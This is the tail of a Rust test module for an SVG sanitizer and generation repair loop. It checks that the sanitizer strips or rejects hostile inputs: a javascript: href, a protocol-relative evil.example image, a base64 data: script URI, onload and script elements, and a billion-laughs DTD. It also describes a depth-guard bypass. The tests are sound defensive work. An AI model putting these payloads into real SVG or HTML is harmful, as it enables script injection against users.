        assert!(out.svg.contains(r#"mask-type="alpha""#), "{}", out.svg);
    }

    #[test]
    fn resource_reference_attribute_list_is_pinned() {
        // Rule 6's whole false-positive guard is this list, so what is in it
        // and what is deliberately out are both part of the contract.
        for referencing in [
            "href",
            "xlink:href",
            "src",
            "fill",
            "stroke",
            "filter",
            "mask",
            "clip-path",
            "cursor",
            "marker",
            "marker-start",
            "marker-mid",
            "marker-end",
            "mask-image",
            "mask-border-source",
            "color-profile",
            "background-image",
            "border-image-source",
            "list-style-image",
            "style",
        ] {
            assert!(
                is_resource_reference_attribute(referencing),
                "{referencing} can be dereferenced and must be scanned by rule 6"
            );
        }
        // Deliberately out: none of these is fetched, and every one of them
        // can legitimately hold a colon or a `//`.
        for inert in [
            "d",
            "transform",
            "font-family",
            "points",
            "viewbox",
            "stop-color",
            "id",
            "class",
            "systemlanguage",
            "requiredextensions",
            "xlink:role",
            "xlink:arcrole",
        ] {
            assert!(
                !is_resource_reference_attribute(inert),
                "{inert} is not dereferenced; scanning it only risks false positives"
            );
        }
    }

    #[test]
    fn hostile_href_schemes_and_protocol_relative_targets_are_stripped() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a><image href="//evil.example/x.svg"/><image href="data:text/html;base64,PHNjcmlwdD4="/></svg>"##,
        );
        assert!(!out.svg.contains("javascript"), "{}", out.svg);
        assert!(!out.svg.contains("evil.example"), "{}", out.svg);
        assert!(!out.svg.contains("data:"), "{}", out.svg);
        assert_eq!(
            out.removed.iter().filter(|r| r.contains("href")).count(),
            3,
            "every hostile href must be reported: {:?}",
            out.removed
        );
    }

    #[test]
    fn legitimate_svg_survives_the_tightened_reference_rules() {
        // The false positive the scheme test had to avoid: a value that
        // merely *contains* a colon is not a URL, and an attribute that no
        // renderer dereferences is not a reference at all.
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="grad"/></defs><use href="#gradient"/><path d="M0 0L1 1" fill="url(#grad)" stroke="url(#grad)"/><text font-family="Foo: Bar" transform="translate(1,2)">hi</text></svg>"##,
        );
        assert!(
            out.removed.is_empty(),
            "legitimate SVG must survive intact: {:?}",
            out.removed
        );
        assert!(out.svg.contains(r##"href="#gradient""##), "{}", out.svg);
        assert!(out.svg.contains(r##"fill="url(#grad)""##), "{}", out.svg);
        assert!(out.svg.contains(r#"d="M0 0L1 1""#), "{}", out.svg);
        assert!(out.svg.contains(r#"font-family="Foo: Bar""#), "{}", out.svg);
        assert!(
            out.svg.contains(r#"transform="translate(1,2)""#),
            "{}",
            out.svg
        );
    }

    #[test]
    fn scheme_test_is_anchored_and_accepts_relative_references() {
        assert!(starts_with_url_scheme("data:text/html,x"));
        assert!(starts_with_url_scheme("HTTPS://example.test"));
        assert!(starts_with_url_scheme("x-custom+v1.0-beta:payload"));
        // Anchored: a colon after the first non-scheme byte is punctuation.
        assert!(!starts_with_url_scheme("Foo Bar: baz"));
        assert!(!starts_with_url_scheme("#fragment"));
        assert!(!starts_with_url_scheme("1nvalid:x"));
        assert!(!starts_with_url_scheme("./icons/star.svg"));
        assert!(!starts_with_url_scheme(""));
        // …but a colon straight after a legal scheme body still counts, which
        // is why the resource-attribute restriction is the second half of the
        // guard rather than an optimization.
        assert!(starts_with_url_scheme("Foo: Bar"));
    }

    #[test]
    fn xml_prefixed_attributes_are_reemitted_with_their_prefix() {
        // `xml:` is bound by every conformant parser, so the prefix must
        // survive re-serialization — a bare `space="preserve"` is not the
        // same attribute and not valid SVG.
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><text xml:space="preserve" xml:lang="en">  a  b  </text></svg>"#,
        );
        assert!(out.svg.contains(r#"xml:space="preserve""#), "{}", out.svg);
        assert!(out.svg.contains(r#"xml:lang="en""#), "{}", out.svg);
        assert!(!out.svg.contains(" space="), "{}", out.svg);
        assert!(out.removed.is_empty(), "{:?}", out.removed);
        // The emitted prefix re-parses without a declaration, so the
        // sanitizer stays a fixed point.
        let twice = process(&out.svg);
        assert_eq!(out.svg, twice.svg);
    }

    #[test]
    fn foreign_namespace_elements_and_attributes_are_dropped_not_unprefixed() {
        // Re-emitting a foreign name unprefixed would re-parse it as the SVG
        // name it never was: an <e:image> must not come back as a live
        // <image>, and a foreign attribute must not shadow an SVG one.
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:e="http://evil.example/ns"><e:image href="#x"><rect/></e:image><rect e:mark="tracked" width="2"/></svg>"##,
        );
        assert!(!out.svg.contains("<image"), "{}", out.svg);
        assert!(!out.svg.contains("mark"), "{}", out.svg);
        assert!(out.svg.contains(r#"width="2""#), "{}", out.svg);
        assert!(
            out.removed
                .iter()
                .any(|r| r.contains("image") && r.contains("foreign namespace")),
            "{:?}",
            out.removed
        );
        assert!(
            out.removed
                .iter()
                .any(|r| r.contains("mark") && r.contains("foreign namespace")),
            "{:?}",
            out.removed
        );
    }

    #[test]
    fn foreign_object_and_metadata_and_comments_are_dropped() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><metadata>junk</metadata><!-- a comment --><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject><rect/></svg>"#,
        );
        assert!(!out.svg.contains("foreignObject"), "{}", out.svg);
        assert!(!out.svg.contains("metadata"), "{}", out.svg);
        assert!(!out.svg.contains("comment"), "{}", out.svg);
        assert!(out.svg.contains("<rect"));
    }

    #[test]
    fn dtd_is_rejected_as_a_parse_error_billion_laughs_guard() {
        let hostile = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "ha"><!ENTITY lol2 "&lol;&lol;">]><svg xmlns="http://www.w3.org/2000/svg"/>"#;
        let err = SvgPipeline::process(hostile).unwrap_err();
        assert!(matches!(err, SvgError::Parse { .. }), "{err:?}");
    }

    #[test]
    fn malformed_svg_reports_line_and_col() {
        let err = SvgPipeline::process("<svg><rect></svg>").unwrap_err();
        match err {
            SvgError::Parse { line, col, .. } => {
                assert!(line >= 1);
                assert!(col >= 1);
            }
            other => panic!("expected Parse, got {other:?}"),
        }
    }

    #[test]
    fn non_svg_root_is_rejected() {
        let err =
            SvgPipeline::process(r#"<html xmlns="http://www.w3.org/2000/svg"/>"#).unwrap_err();
        assert_eq!(err, SvgError::NoSvgRoot);
    }

    #[test]
    fn viewbox_is_backfilled_from_width_and_height() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><rect/></svg>"#,
        );
        assert!(out.svg.contains("viewBox=\"0 0 200 100\""), "{}", out.svg);
    }

    #[test]
    fn sanitizer_is_idempotent() {
        let hostile = r##"<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><script>x()</script><rect onload="y()" fill="url(https://evil/x)" stroke="#111"/><!-- c --></svg>"##;
        let once = process(hostile);
        let twice = process(&once.svg);
        assert_eq!(once.svg, twice.svg, "second pass must be a fixed point");
        assert!(
            twice.removed.is_empty(),
            "nothing left to strip: {:?}",
            twice.removed
        );
    }

    #[test]
    fn whitespace_in_text_is_collapsed() {
        let out = process(
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>hello    \n   world</text></svg>",
        );
        assert!(out.svg.contains(">hello world<"), "{}", out.svg);
    }

    // repair loop

    struct ScriptedGenerator {
        outputs: std::sync::Mutex<Vec<String>>,
        saw_prior_error: std::sync::atomic::AtomicBool,
    }

    #[async_trait]
    impl SvgGenerator for ScriptedGenerator {
        async fn generate(&self, _prompt: &str, prior_error: Option<&str>) -> String {
            if prior_error.is_some() {
                self.saw_prior_error
                    .store(true, std::sync::atomic::Ordering::SeqCst);
            }
            let mut outputs = self.outputs.lock().expect("lock");
            if outputs.is_empty() {
                "<svg/>".to_string()
            } else {
                outputs.remove(0)
            }
        }
    }

    #[tokio::test]
    async fn repair_loop_recovers_on_a_later_attempt_and_feeds_back_the_error() {
        let generator = ScriptedGenerator {
            outputs: std::sync::Mutex::new(vec![
                "<svg><rect></svg>".to_string(), // malformed
                r#"<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>"#.to_string(),
            ]),
            saw_prior_error: std::sync::atomic::AtomicBool::new(false),
        };
        let out = SvgPipeline::generate(&generator, "a box", 3).await.unwrap();
        assert!(out.svg.contains("<rect"));
        assert!(
            generator
                .saw_prior_error
                .load(std::sync::atomic::Ordering::SeqCst),
            "the second attempt must receive the first attempt's error"
        );
    }

    #[tokio::test]
    async fn repair_loop_terminates_and_reports_last_error_when_exhausted() {
        let generator = ScriptedGenerator {
            outputs: std::sync::Mutex::new(vec![
                "<svg><a></svg>".to_string(),
                "<svg><b></svg>".to_string(),
            ]),
            saw_prior_error: std::sync::atomic::AtomicBool::new(false),
        };
        let err = SvgPipeline::generate(&generator, "x", 2).await.unwrap_err();
        match err {
            SvgError::RepairExhausted { attempts, last } => {
                assert_eq!(attempts, 2);
                assert!(!last.is_empty());
            }
            other => panic!("expected RepairExhausted, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn generate_clamps_attempts_to_at_least_one() {
        let generator = ScriptedGenerator {
            outputs: std::sync::Mutex::new(vec!["<svg><bad></svg>".to_string()]),
            saw_prior_error: std::sync::atomic::AtomicBool::new(false),
        };
        // max_attempts = 0 must still make exactly one attempt.
        let err = SvgPipeline::generate(&generator, "x", 0).await.unwrap_err();
        assert!(matches!(err, SvgError::RepairExhausted { attempts: 1, .. }));
    }

    #[test]
    fn a_pathologically_deep_svg_is_rejected_not_a_stack_overflow() {
        // Both roxmltree's tokenizer and this module's serializer recurse per
        // nesting level, so `process` must reject an over-deep tree with a
        // typed error instead of aborting the process.
        let depth = MAX_NESTING_DEPTH + 500;
        let mut svg = String::from("<svg xmlns=\"http://www.w3.org/2000/svg\">");
        svg.push_str(&"<g>".repeat(depth));
        svg.push_str(&"</g>".repeat(depth));
        svg.push_str("</svg>");

        let err = SvgPipeline::process(&svg).expect_err("deep tree must be rejected");
        assert!(
            matches!(err, SvgError::TooDeeplyNested),
            "expected TooDeeplyNested, got {err:?}"
        );

        // A shallow tree still processes normally.
        let ok =
            SvgPipeline::process("<svg xmlns=\"http://www.w3.org/2000/svg\"><g><rect/></g></svg>");
        assert!(ok.is_ok(), "a normal SVG must still process: {ok:?}");
    }

    #[test]
    fn depth_guard_is_not_fooled_by_markup_inside_attribute_values() {
        // `>` and `/` are legal unescaped inside an attribute value, so a
        // depth scan that counts raw `/>` byte pairs reads every one of these
        // elements as self-closing and stays at depth ~0 while the document
        // nests without bound — a guard bypass straight to a stack overflow.
        let depth = MAX_NESTING_DEPTH + 500;
        let mut svg = String::from("<svg xmlns=\"http://www.w3.org/2000/svg\">");
        svg.push_str(&"<g d=\"/>\">".repeat(depth));
        svg.push_str(&"</g>".repeat(depth));
        svg.push_str("</svg>");

        let err = SvgPipeline::process(&svg).expect_err("the bypass must be rejected");
        assert!(
            matches!(err, SvgError::TooDeeplyNested),
            "expected TooDeeplyNested, got {err:?}"
        );

        // The same shapes at a legal depth must still round-trip: a scan that
        // over-counts would be just as broken, rejecting valid art. Markup
        // inside an attribute value, a `>` in another value, and a comment
        // full of open tags all have to leave the depth reading alone.
        let legal = r#"<svg xmlns="http://www.w3.org/2000/svg"><g d="/>"><rect a="a>b"/></g><!-- <g><g> --></svg>"#;
        let ok = SvgPipeline::process(legal).expect("legal nesting must still process");
        assert!(ok.svg.contains("<rect"), "{}", ok.svg);
    }
}
